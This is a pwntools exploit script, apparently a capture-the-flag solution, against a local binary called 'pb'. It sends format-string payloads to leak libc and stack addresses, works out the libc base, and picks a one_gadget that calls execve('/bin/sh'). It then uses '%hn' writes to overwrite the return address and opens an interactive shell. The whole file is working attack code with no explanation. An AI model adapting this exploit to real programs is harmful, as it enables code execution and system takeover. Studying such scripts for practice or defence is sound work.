from pwn import *


context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'sp' ,'-h']

libc = ELF('./libc-2.23.so')

io = process("./pb")

payload = "%11$p%13$p"
gdb.attach(io, 'b *0x400779')
io.sendlineafter("How to do?\n", payload)
 
leak = eval(io.recv(14))
info(hex(leak))

libc_start_main = leak - 240
info(hex(libc_start_main))

libc_base = libc_start_main - libc.sym['__libc_start_main']
info(hex(libc_base))

'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one_gadget_list = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
one_gadget = libc_base + one_gadget_list[3]
info(hex(one_gadget))
#raw_input()

stack_leak_addr = eval(io.recv(14))
info(hex(stack_leak_addr))

ret_addr = stack_leak_addr - 256 + 32
info(hex(ret_addr))
 
write_in = ret_addr & 0xffff
num_len = len(str(write_in))
payload = "%{}c%13$hn".format(write_in - num_len + 5)
io.sendlineafter("How to do?\n", payload)
payload = "%{}c%39$hn".format((one_gadget & 0xffff))
io.sendlineafter("How to do?\n", payload)

payload = "%{}c%13$hn".format(write_in - num_len + 7)
io.sendlineafter("How to do?\n", payload)
payload = "%{}c%39$hn".format(((one_gadget >> 16) & 0xffff))
#gdb.attach(io, "b *0x400779")
io.sendlineafter("How to do?\n", payload)

io.sendlineafter("How to do?\n", 'a'*100)


io.interactive()

